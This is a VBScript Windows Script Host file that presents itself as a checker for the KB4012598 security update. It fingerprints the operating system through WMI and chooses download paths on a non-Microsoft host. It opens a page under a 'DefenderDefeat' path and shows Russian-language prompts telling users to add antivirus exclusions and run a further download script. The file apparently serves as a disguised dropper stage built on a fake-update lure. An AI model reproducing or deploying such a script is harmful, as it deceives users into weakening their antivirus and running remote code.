<?xml version="1.0" encoding="utf-8"?>
<!-- ***************************** -->
<!-- File wsf -->
<!-- MSI_Choice.wsf -->
<!--
This File Checks a Current Operation System
for Security Update to be Applied
-->
<!-- ***************************** -->
<job id="ID1">
<script language="JScript">
	<![CDATA[
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
' *********************************************************
' getWindowsOperationSystemType
' This Function Gets Windows Operation System Types
' *********************************************************

Function getWindowsOperationSystemType()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
        strOS = objOperatingSystem.Version
    Next
    If InStr(1, strOS, "6.1.", vbTextCompare ) Then
        getWindowsOperationSystemType = "6.1"
    elseif InStr(1, strOS, "6.3.", vbTextCompare) Then
        getWindowsOperationSystemType = "6.3"
    elseif InStr(1, strOS, "10.0.22", vbTextCompare) Then
        getWindowsOperationSystemType = "11"
    elseif InStr(1, strOS, "10.0.", vbTextCompare) Then
        getWindowsOperationSystemType = "10"
    Else
        getWindowsOperationSystemType = "Other"
    End If
End Function

Function getWindowsOSArchitecture()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
        strArch = objOperatingSystem.OSArchitecture
    Next
    If InStr(1, strArch, "32", vbTextCompare ) Then
        getWindowsOSArchitecture = "x86"
    elseif InStr(1, strArch, "64", vbTextCompare) Then
        getWindowsOSArchitecture = "x64"
    Else
        getWindowsOSArchitecture = "Other"
    End If
End Function ' getWindowsOSArchitecture

Function getWindowsOSLanguage()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
        strLang = objOperatingSystem.OSLanguage
    Next
    If InStr(1, strLang, "1049", vbTextCompare ) Then
        getWindowsOSLanguage = "Russian"
    elseif InStr(1, strLang, "1033", vbTextCompare) Then
        getWindowsOSLanguage = "English"
    Else
        getWindowsOSLanguage = "Other"
    End If
End Function ' getWindowsOSLanguage

Function getIfWindowsOSServer()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
    For Each objOperatingSystem in colOperatingSystems
        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
        strServer = objOperatingSystem.ProductType
    Next
    If InStr(1, strServer, "1", vbTextCompare ) Then
        getIfWindowsOSServer = "Client"
    elseif InStr(1, strServer, "2", vbTextCompare) Then
        getIfWindowsOSServer = "Server Domain Controller"
    elseif InStr(1, strServer, "3", vbTextCompare) Then
        getIfWindowsOSServer = "Server Standalone"
    Else
        getIfWindowsOSServer = "Other"
    End If
End Function ' getWindowsOSLanguage


Function getIfWindowsOSCore()
    Dim fso, wsh, envProc, pathExplorer
    ' Create ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	Set envProc = wsh.Environment("PROCESS")
    ' Set Windows Explorer Path
    pathExplorer = envProc("SystemRoot") & "\explorer.exe"
    ' Check If a file explorer.exe is present
    If fso.FileExists(pathExplorer) Then
        getIfWindowsOSCore = "Desktop"
    Else
        getIfWindowsOSCore = "Core"
    End If
End Function

' WScript.Echo "Windows " & getWindowsOperationSystemType & " " & getWindowsOSArchitecture & " " & getWindowsOSLanguage & " " & getIfWindowsOSServer
		
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
' *********************************************************
' Choice-MSI.vbs
' This File Contains the Script for a Choice of an MSI
' File to be Downloaded
' The Script Uses Libraries from other Files
' *********************************************************
Function CheckOSAndChooseFile()
    Dim anOSFamily, anOSArchitecture, bIsOSClients, bIsOSCore, anURLPath
    Dim aWCLIENTS, aW2K22, aW63X64DESK, aW63X64CORE, aW61X64DESK, aW61X64CORE
    ' Set Most Common URL Path
    anURLPath = "http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/MSI/"
    ' Set the Values of the URL Paths of Variables
    aWCLIENTS = anURLPath & "WCLIENTS/"
    aW2K22 = anURLPath & "W2K22/"
    aW63X64CORE = anURLPath & "W63X64CORE/"
    aW63X64DESK = anURLPath & "W63X64DESK/"
    aW61X64CORE = anURLPath & "W61X64CORE/"
    aW61X64DESK = anURLPath & "W61X64DESK/"
    anOSFamily = getWindowsOperationSystemType
    bIsOSClients = getIfWindowsOSServer
    bIsOSCore = getIfWindowsOSCore
    anOSArchitecture = getWindowsOSArchitecture
    ' WScript.Echo "Windows " & anOSFamily & " " & anOSArchitecture & " " & bIsOSClients & " " & bIsOSCore & vbNewLine
    If InStr(1, anOSFamily, "Other", vbTextCompare) Then
        CheckOSAndChooseFile = ""
    ElseIf InStr(1, anOSFamily, "11", vbTextCompare) Then
        CheckOSAndChooseFile = aWCLIENTS
    ElseIf InStr(1, anOSFamily, "10", vbTextCompare) Then
        If InStr(1, bIsOSClients, "Client", vbTextCompare) Then
            CheckOSAndChooseFile = aWCLIENTS
        ElseIf InStr(1, bIsOSClients, "Server", vbTextCompare) Then
            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
                CheckOSAndChooseFile = aW2K22
            ElseIf InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
                CheckOSAndChooseFile = aW2K22
            Else
                CheckOSAndChooseFile = ""
            End If
        Else
            CheckOSAndChooseFile = ""
        End If
    ElseIf InStr(1, anOSFamily, "6.3", vbTextCompare) Then
        If InStr(1, anOSArchitecture, "x86", vbTextCompare) Then
            CheckOSAndChooseFile = ""
        ElseIf InStr(1, anOSArchitecture, "x64", vbTextCompare) Then
            If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
                CheckOSAndChooseFile = aW63X64CORE
            ElseIf Instr(1, bIsOSCore, "Desktop", vbTextCompare) Then
                CheckOSAndChooseFile = aW63X64DESK
            Else
                CheckOSAndChooseFile = ""
            End If                
        Else
            CheckOSAndChooseFile = ""
        End If
    ElseIf InStr(1, anOSFamily, "6.1", vbTextCompare) Then
        If InStr(1, bIsOSCore, "Core", vbTextCompare) Then
            CheckOSAndChooseFile = aW61X64CORE
        elseif InStr(1, bIsOSCore, "Desktop", vbTextCompare) Then
            CheckOSAndChooseFile = aW61X64DESK
        Else
            CheckOSAndChooseFile = ""
        End If
    Else
        CheckOSAndChooseFile = ""
    End If
End Function

' **********************************************************************
' CheckOSAndPutMessage
' This Function Checks if Update KB4012598 is Accessible and Put a Message
' Function Return:
'   0 if Update can Apply at automatic Mode
'   1 if Update can Apply at manual Mode
'   2 if Update cann't Apply
' **********************************************************************

Function CheckOSAndPutMessage()
    Dim anOSFamily, bIsOSClient, anMSIPath, anURLWebApp, wsh, strValue, ie
    Dim aNotFound, aNotExclusions, anSuccessFound
    anOSFamily = getWindowsOperationSystemType
    bIsOSClient = getIfWindowsOSServer
    anMSIPath = CheckOSAndChooseFile
    anURLWebApp = "http://file.netip4.ru:80/PROGS/NIT/DefenderDefeat/html/main.html"

    ' Set Command String
    strValue = "start " & anURLWebApp

    aNotFound  = "Для Вашей операционной системы не найдены исправления безопасности или они не применимы." & vbNewLine & "Пожалуйста, обновите Вашу систему через Windows Update."
    aNotExclusions = "Для Вашей операционной системы найдекны обновления, но в системе дополнительно требуется установить исключения антивируса." & vbNewLine & "Пожалуйста, установите исключения вашего антивируса в следующем окне, а затем запустите файл KB4012598-Download.wsh."
    anSuccessFound = "Для Вашей операционной системы найдены обновления безопасности." & vbNewLine & "Скачайте запустите файл KB4012598-Download.wsh."
    ' Create ActiveX Objects
    set wsh = CreateObject("Wscript.Shell")
    set ie = CreateObject("InternetExplorer.Application")
    ie.navigate2 anURLWebApp
    If Len(anMSIPath) = 0 Then
        WScript.Echo aNotFound
        CheckOSAndPutMessage = 2
    Else
        If InStr(1, anOSFamily, "10", vbTextCompare) Or InStr(1, anOSFamily, "11", vbTextCompare) Then
            WScript.Echo anSuccessFound
            CheckOSAndPutMessage = 0
        Else
            If InStr(1, bIsOSClient, "Client", vbTextCompare) Then
                WScript.Echo aNotExclusions
                ie.Visible = True
                CheckOSAndPutMessage = 1
            Else
                WScript.Echo anSuccessFound
                CheckOSAndPutMessage = 0
            End If
        End If
    End If
End Function
	]]>
	</script>
	<script language="VBScript">
	<![CDATA[
Dim iFlag
iFlag = CheckOSAndPutMessage
If iFlag = 0 Then
    WScript.Echo "Обновление может установиться в автоматическом режиме."
ElseIf iFlag = 1 Then
    WScript.Echo "Обновление может установиться только в ручном режиме."
Else
    WScript.Echo "Обновление не может быть установлено."
End If
WScript.Echo "URL Path = " & CheckOSAndChooseFile
	]]>
	</script>
</job>
